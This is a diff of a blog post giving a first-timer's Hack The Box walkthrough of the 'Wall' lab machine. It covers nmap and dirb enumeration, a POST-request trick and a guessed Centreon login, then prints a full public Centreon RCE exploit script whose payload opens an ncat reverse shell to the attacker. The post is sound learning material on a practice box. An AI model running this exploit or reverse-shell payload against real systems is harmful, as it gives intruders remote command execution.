@@ -5,20 +5,21 @@ code: htb_wall
 date: "27th November 2019"
 author: rubytox
 ---
-    <p>Hello everyone!</p>
+<p>Hello everyone!</p>
 
-    <p>So about a week and a half ago, I decided that I would try to own my first box on Hackthebox.
-        I wanted to start with an easy one, so I chose Wall because a lot of people were saying this box was rather easy to own.
-        It was a really interesting first experience as I learned a lot of things, even if I had to look for a lot of clues and hints because there are a lot of concepts
-        I couldn’t think of by myself.</p>
+<p>So about a week and a half ago, I decided that I would try to own my first box on Hackthebox.
+    I wanted to start with an easy one, so I chose Wall because a lot of people were saying this box was rather easy to own.
+    It was a really interesting first experience as I learned a lot of things, even if I had to look for a lot of clues and hints because there are a lot of concepts
+    I couldn’t think of by myself.</p>
 
-    <p>Before we start, I just want to say that this walkthrough might not be as a usual one: I will talk about what I tried, even if it didn’t work, and
-        I try to explain why what I did didn’t work, so it might be long and become kind of uninteresting at some point.
-        However, I think it is really instructive about what mistakes you maybe didn’t but might do at some point.</p>
+<p>Before we start, I just want to say that this walkthrough might not be as a usual one: I will talk about what I tried, even if it didn’t work, and
+    I try to explain why what I did didn’t work, so it might be long and become kind of uninteresting at some point.
+    However, I think it is really instructive about what mistakes you maybe didn’t but might do at some point.</p>
 
-    <p>So, let’s get started! First, to make things easier I updated <code>/etc/hosts</code> in order to associate the IP address
-        10.10.10.157 with the name <code>wall.ctf</code>. Then, I used <code>nmap</code> to get the machine open ports, which gave me the following result:</p>
-    <pre><code>
+<p>So, let’s get started! First, to make things easier I updated <code>/etc/hosts</code> in order to associate the IP address
+    10.10.10.157 with the name <code>wall.ctf</code>. Then, I used <code>nmap</code> to get the machine open ports, which gave me the following result:</p>
+
+    <pre class="prettyprint nocode">
 $ nmap -sV -sT -sC wall.ctf
 Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-15 15:35 CET
 Nmap scan report for wall.ctf (10.10.10.157)
@@ -35,15 +36,224 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 44.21 seconds
-</code></pre>
+</pre>
 
-    <p>Here is a nice snippet, look at it!</p>
-    <pre class="prettyprint">
-        #include &lt;iostream&gt;
-        #include &lt;cmath&gt;
+<p>Here is a nice snippet, look at it!</p>
 
-        int main() {
-            return 0;
-        }
-    </pre>
+<p>So we found that the port 80 is open and that Apache is listening on it.
+    We learn as well that the page displayed by Apache is the default page, which we can confirm by accessing <code>wall.ctf</code> in a web browser.
+    As this was my very first machine, I didn’t really know what to do: I could only see a web page with nothing more behind it.</p>
+
+<p>However, after some time I came across an idea I should have thought about very quickly: there can be other files and directories around
+    the Apache default page. I learned about <code>dirb</code>, a tool that uses a wordlist to enumerate all the possible pages that could exist on the server.
+    I first tried to list all PHP files at the root of the server using the following command:</p>
+
+<pre class="prettyprint nocode">$ dirb http://wall.ctf -X .php
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+OUTPUT_FILE: dirb.out
+START_TIME: Fri Nov 15 15:55:59 2019
+URL_BASE: http://wall.ctf/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612
+---- Scanning URL: http://wall.ctf/ ----
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+OUTPUT_FILE: dirb.out
+START_TIME: Fri Nov 15 15:57:45 2019
+URL_BASE: http://wall.ctf/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+-----------------
+GENERATED WORDS: 4612
+---- Scanning URL: http://wall.ctf/ ----
++ http://wall.ctf/aa.php (CODE:200|SIZE:1)
++ http://wall.ctf/panel.php (CODE:200|SIZE:26)
+-----------------
+END_TIME: Fri Nov 15 16:06:58 2019
+DOWNLOADED: 4612 - FOUND: 2
+</pre>
+
+<p>We found two PHP pages, which aren’t really interesting: <code>aa.php</code> only displays the number 1, and
+    <code>panel.php</code> displays “Just a test for php file !”. So I thought it might be useful later and
+    decided to move on another enumeration :</p>
+<pre class="prettyprint nocode">$ dirb http://wall.ctf
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+OUTPUT_FILE: dirb.out2
+START_TIME: Fri Nov 15 16:09:15 2019
+URL_BASE: http://wall.ctf/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612
+---- Scanning URL: http://wall.ctf/ ----
++ http://wall.ctf/index.html (CODE:200|SIZE:10918)
++ http://wall.ctf/monitoring (CODE:401|SIZE:455)
++ http://wall.ctf/server-status (CODE:403|SIZE:296)
+-----------------
+END_TIME: Fri Nov 15 16:18:52 2019
+DOWNLOADED: 4612 - FOUND: 3
+</pre>
+
+<p>This time, <code>dirb</code> obviously found <code>index.html</code> and <code>server-status</code>,
+    but also a pretty interesting page called <code>monitoring</code>. When we try to access the page,
+    it asks for a username and a password.</p>
+
+<p>At first, I wanted to try to find a way to bruteforce it, but reading some posts of the Hackthebox forum I saw a
+    lot of people saying bruteforce wasn’t the intended way to own the box. I took some time to think about this page,
+    and I didn’t find anything relevant. However, one of the hint was particularly useful: it was said to focus about
+    verbs in the English language. After a while, I finally tried to request the <code>monitoring</code> page using
+    another method, <code>POST</code> for instance, which gave the following result:</p>
+
+<pre class="prettyprint nocode">
+$ curl -XPOST http://wall.ctf/monitoring/
+&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;
+&lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;
+&lt;meta http-equiv="refresh" content="0; URL='/centreon'" /&gt;
+</pre>
+
+<p>Little warning in this step: at first, I omitted the “/” at the end of the request so I got a 301 response,
+    which however led me to add the “/”.</p>
+
+<p>So we learn here that we would like to be redirected to a page called <code>centreon</code>, at the root of the server.
+    Let’s get there in our browser! We then get the following login form:</p>
+
+<img src="/img/{{ page.code }}/centreon_login.png" alt="Centreon login page" />
+
+<p>So I guess we should learn a bit more about what is Centreon: Wikipedia tells us Centreon is a supervising software.
+    It allows to monitor applications, systems and networks.<sup><a href="#fn1" id="ref1">1</a></sup> It is based on Nagios, which is a monitoring software as well.</p>
+
+<p>The interesting part is that this version of Centreon allows to perform a RCE, which was exposed by Askar (box maker)
+    in the CVE-2019-13024.<sup><a href="#fn2" id="ref2">2</a></sup> This post actually gives us a RCE exploit script, however we need to be logged in the
+    Centreon administration panel to use it. So first, we need to find the right credentials.</p>
+
+<p>Basic tests already show us interesting behaviour: some characters aren’t allowed in the form, such as a space, a #,
+    or the string “passwd”. This could mean there is a WAF (Web Application Firewall) installed on the server. For now,
+    it isn’t really troublesome, it actually helps knowing which characters we can’t use.</p>
+
+<p>At first I tried to bruteforce the login form, which led to nothing at all, apart from teaching myself how to use
+    <code>hydra</code>. However, after having read some advices on Hackthebox forum, I just tried some random login/password pairs,
+    and it finally worked with <strong>admin</strong> and <strong>password1</strong>. We got the centreon panel!</p>
+
+<p>So now comes the fun part. As we discovered it earlier, there exists a CVE which should spawn a reverse shell.
+    However, starting ncat and executing the script isn’t enough, because when we do so we get no incoming connection.
+    Let’s take a look at the script, find on Askar’s post:<sup><a href="#fn2" id="ref2">3</a></sup></p>
+
+<pre class="prettyprint linenums">
+#!/usr/bin/python
+
+'''
+# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
+# Date: 28/06/2019
+# Exploit Author: Askar (@mohammadaskar2)
+# CVE : CVE-2018-20434
+# Vendor Homepage: https://www.centreon.com/
+# Software link: https://download.centreon.com
+# Version: v19.04
+# Tested on: CentOS 7.6 / PHP 5.4.16
+'''
+
+import requests
+import sys
+import warnings
+from bs4 import BeautifulSoup
+
+# turn off BeautifulSoup warnings
+warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
+
+if len(sys.argv) != 6:
+    print(len(sys.argv))
+    print("[~] Usage : ./centreon-exploit.py url username password ip port")
+    exit()
+
+url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+ip = sys.argv[4]
+port = sys.argv[5]
+
+
+request = requests.session()
+print("[+] Retrieving CSRF token to submit the login form")
+page = request.get(url+"/index.php")
+html_content = page.text
+soup = BeautifulSoup(html_content)
+token = soup.findAll('input')[3].get("value")
+
+login_info = {
+    "useralias": username,
+    "password": password,
+    "submitLogin": "Connect",
+    "centreon_token": token
+}
+login_request = request.post(url+"/index.php", login_info)
+print("[+] Login token is : {0}".format(token))
+if "Your credentials are incorrect." not in login_request.text:
+    print("[+] Logged In Sucssfully")
+    print("[+] Retrieving Poller token")
+
+    poller_configuration_page = url + "/main.get.php?p=60901"
+    get_poller_token = request.get(poller_configuration_page)
+    poller_html = get_poller_token.text
+    poller_soup = BeautifulSoup(poller_html)
+    poller_token = poller_soup.findAll('input')[24].get("value")
+    print("[+] Poller token is : {0}".format(poller_token))
+
+    payload_info = {
+        "name": "Central",
+        "ns_ip_address": "127.0.0.1",
+        # this value should be 1 always
+        "localhost[localhost]": "1",
+        "is_default[is_default]": "0",
+        "remote_id": "",
+        "ssh_port": "22",
+        "init_script": "centengine",
+        # this value contains the payload , you can change it as you want
+        "nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
+        "nagiostats_bin": "/usr/sbin/centenginestats",
+        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
+        "centreonbroker_cfg_path": "/etc/centreon-broker",
+        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
+        "centreonbroker_logs_path": "",
+        "centreonconnector_path": "/usr/lib64/centreon-connector",
+        "init_script_centreontrapd": "centreontrapd",
+        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
+        "ns_activate[ns_activate]": "1",
+        "submitC": "Save",
+        "id": "1",
+        "o": "c",
+        "centreon_token": poller_token,
+
+
+    }
+
+    send_payload = request.post(poller_configuration_page, payload_info)
+    print("[+] Injecting Done, triggering the payload")
+    print("[+] Check your netcat listener !")
+    generate_xml_page = url + "/include/configuration/configGenerate/xml/generateFiles.php"
+    xml_page_data = {
+        "poller": "1",
+        "debug": "true",
+        "generate": "true",
+    }
+    request.post(generate_xml_page, xml_page_data)
+
+else:
+    print("[-] Wrong credentials")
+    exit()
+</pre>
+
+<hr />
+
+<sup id="fn1">1. https://fr.wikipedia.org/wiki/Centreon (in french)<a href="#ref1" title="Jump back to footnote 1 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn2">2, 3. https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/<a href="#ref2" title="Jump back to footnote 2 in the text.">↩</a></sup>
 
